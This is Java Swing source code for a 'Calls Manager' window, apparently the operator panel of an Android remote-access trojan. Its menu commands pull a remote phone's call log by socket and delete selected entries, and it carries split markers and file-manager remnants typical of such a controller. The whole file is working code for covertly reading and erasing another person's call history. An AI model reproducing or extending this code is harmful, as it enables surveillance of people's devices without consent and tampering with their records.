package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class Android_Calls_Manager {

	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem getinbox;
    private  JMenuItem getoutbox;
    private  String File_Seperator ="x";
    private  int Upload_Chunk = 0;
    private  int there_but_notsent=0;
    private  boolean exit_unstable = false;
	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	private  String grab="False";
	private  String File_Sep = ""; 
	private  String YY="";
	public Android_Calls_Manager(String ip){
		this.sock = ip;
	
	}
	public JTextArea get_DIR(){
		return Dir;
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public void Set_File_Sep(String s){
		File_Sep = s;
	}
	public String Get_sock(){
		return sock ;
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3,String str4 ){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("Drive.png"));
				 /*for(int row = 0;row < j.getRowCount();row++) {
					  for(int col = 0;col < j.getColumnCount();col++) {
						 
				 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
				 	    		 // new MessageBox().infoBox(str1, str2);
				 	    		 //remo_row(str1,str2);
				 	    		  Model.addRow(new Object[]{icon,str1, str2, str3});
				 	    		 // Model.removeRow(row);
				 	    	}
				 	      }
				 	}*/
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("calllog.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("calllog.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
			 }
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			  
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	
	 public  void Do_frame(){
		if (form==null){
			 form = new JFrame();
			   form.addWindowListener(new java.awt.event.WindowAdapter() {
				    @Override
				    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
				   
				    	 if (JOptionPane.showConfirmDialog(form, 
				            "Are you sure you want to close Call Logs Manager "+ sock +" window?", "Close Window?", 
				            JOptionPane.YES_NO_OPTION,
				            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
				    	     Master.Remove_Form_CallsManager_Android(sock);
				    	 	form.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
				        }else{
				        	form.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
				        	
				        }
				    }
				}); 
				
				
		}
		 form.setName("Calls Manager For : " + sock);
		 form.setTitle("Calls Manager For : " + sock);
		 title = "Calls Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		  
			 
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     getinbox = new JMenuItem("Refresh");  
		     getoutbox = new JMenuItem("Delete Log");
		   
		 
			getinbox.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "refresh.png" )));
			getoutbox.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "calllogget.png" )));
		 
			getinbox.setBackground(new Color(0, 64, 128));
			 
			getoutbox.setBackground(new Color(0, 64, 128));
			 
			getinbox.setForeground(Color.WHITE);
			getoutbox.setForeground(Color.WHITE);
			
			popupMenu.add(getinbox);
		 
			popupMenu.add(getoutbox);
			 
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Number", "NAME / Contact", "Call Type","Log Date"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
		 	   j.setGridColor(new Color(0, 64, 128));
			   j.setBackground(new Color(0, 64, 128) );
			   j.setOpaque(true);
			   j.setFillsViewportHeight(true);
			   j.setForeground(Color.WHITE);
	        
	        j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	            	   /*
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                  
	                  if (item_type.contains("Folder")||item_type.contains("Drive")){
	                 
	                	  
	                		 if(item_type.contains("null D") || Dir.getText().contains("/")){
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + "/");  
			                	  Dir.repaint();
	                		 }else{
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + (File_Sep).charAt(0) );  
			                	  Dir.repaint();
	                		 }
		                	
		                	 // System.out.print("here enter command : " + Dir.getText());
		                	  get_row_index(); //clear jtable
		                	  System.out.println("iam          " + sock );
		                	  sock = title.replace("File Manager For : "  , "");
		                	 // new MessageBox().infoBox("iam " + sock, "");
		                	 // Master.Send_Data("file_manager" + Exe_Split  + Dir.getText().replace("//", "/")   , sock,true);
		                 
	                	  
	                 }
	                  */
	                  
	               }
	            }
	         });
	        
	        
	     
	        getoutbox.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  				 
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						Master.Send_Data("calls_manager_delete"  +  Exe_Split+  selected_item +  Exe_Split , sock,true);
						get_row_index();
						Master.Send_Data("calls_manager" + Exe_Split ,sock,true);
	  					
	  		         
	  				}
	  			});
	  			
	        
	        
	        getinbox.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					 Master.Send_Data("calls_manager" + Exe_Split ,sock,true);
		         
				}
			}); 
	    
	       
	        
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		 
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		    
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        sp.setComponentPopupMenu(popupMenu);
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		    
		        //Buttons.add(Dir);
		    
		  
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT,sp,Buttons );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(1200);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(1200 );
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	private void remo_row(String str1,String str2){
		 DefaultTableModel Model = (DefaultTableModel) j.getModel();
		 for(int row = 0;row < Model.getRowCount();row++) {
			  for(int col = 0;col < Model.getColumnCount();col++) {
				 
		 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
		 	    		//  new MessageBox().infoBox(str1, str2);
		 	    		 Model.removeRow(row);
		 	    		 j.revalidate();
		 	    	}
		 	      }
		 	}
	}
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}//    Object[] columnNames = {"^.^","Number", "NAME / Contact", "Date","SMS Content"}; 
	public void Add_SMS(String fname , String cname ,String date ,String content ){
		 
		 yourAddRow("$",fname,cname,date,content);
		 j.repaint();
		 
	     sp.updateUI();
	     sp.repaint();
		 form.repaint();
	}
	 
}
